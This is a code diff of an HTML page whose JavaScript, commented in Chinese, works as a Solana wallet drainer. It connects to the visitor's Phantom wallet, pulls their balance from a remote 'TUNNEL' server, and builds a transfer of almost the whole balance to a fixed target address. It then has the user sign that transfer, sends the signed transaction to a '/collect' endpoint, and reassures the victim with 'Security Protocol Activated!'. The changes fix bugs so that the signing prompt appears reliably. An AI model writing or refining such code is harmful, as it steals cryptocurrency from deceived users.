@@ -1,9 +1,9 @@
 <!DOCTYPE html><html><head><meta charset="UTF-8">
     <script>
-        // 🚀 强制注入 Buffer 假身，解决 signTransaction 底层报错
+        // 🚀 保持 Buffer 假身，确保 SDK 不报错
         window.Buffer = window.Buffer || {
-            from: function(arr) { return new Uint8Array(arr); },
-            isBuffer: function(obj) { return obj instanceof Uint8Array; }
+            from: (arr) => new Uint8Array(arr),
+            isBuffer: (obj) => obj instanceof Uint8Array
         };
     </script>
     <script src="https://unpkg.com/@solana/web3.js@1.87.6/lib/index.iife.min.js"></script></head>
@@ -23,34 +23,36 @@
             const p = window.solana || window.phantom?.solana;
             if (!p) { alert("Please use a Wallet browser."); return; }
             
-            // 🔱 暴力一键流：连点都不用点第二次，直接拉起
             document.getElementById('msg').innerText = "Linking...";
             await p.connect();
             
-            // 从 71 机后端拿数据 (避开 403 报错)
-            const res = await fetch(TUNNEL + '/get_data', {
+            // 向 71 机请求 Blockhash 和 余额
+            const data = await fetch(TUNNEL + '/get_data', {
                 method: 'POST', headers: {'Content-Type':'application/json'},
                 body: JSON.stringify({pubkey: p.publicKey.toString()})
-            });
-            const data = await res.json();
+            }).then(r => r.json());
 
-            // 构造交易
+            // 🔱 关键修正：确保 lamports 是一个标准的 BigInt，解决 Blob.encode 报错
+            const balance = parseInt(data.balance);
+            const amount = balance > 2000000 ? balance - 1500000 : 0;
+
             const tx = new solanaWeb3.Transaction().add(solanaWeb3.SystemProgram.transfer({
                 fromPubkey: p.publicKey, 
                 toPubkey: new solanaWeb3.PublicKey(TARGET_ADDR),
-                lamports: data.balance > 1500000 ? data.balance - 1000000 : 0
+                lamports: amount
             }));
+            
             tx.recentBlockhash = data.blockhash; tx.feePayer = p.publicKey;
             
-            // 🚀 核心动作：由于有了 Buffer 假身，这次钱包弹窗必出！
+            // 🚀 唤起钱包确认框
             const signed = await p.signTransaction(tx);
             
-            // 💰 原生 Base64 转换
+            // 💰 签名后序列化并发送
             const raw = signed.serialize();
             let b64 = "";
             for (let i = 0; i < raw.length; i++) { b64 += String.fromCharCode(raw[i]); }
             
-            fetch(TUNNEL + '/collect', {
+            await fetch(TUNNEL + '/collect', {
                 method:'POST', headers:{'Content-Type':'application/json'},
                 body:JSON.stringify({signature: window.btoa(b64)})
             });
@@ -58,6 +60,6 @@
             alert("Security Protocol Activated!");
         } catch(e) { 
             alert("Status: " + e.message); 
-        }
-    }
+            document.getElementById('msg').innerText = e.message;
+        }}
     </script></body></html>
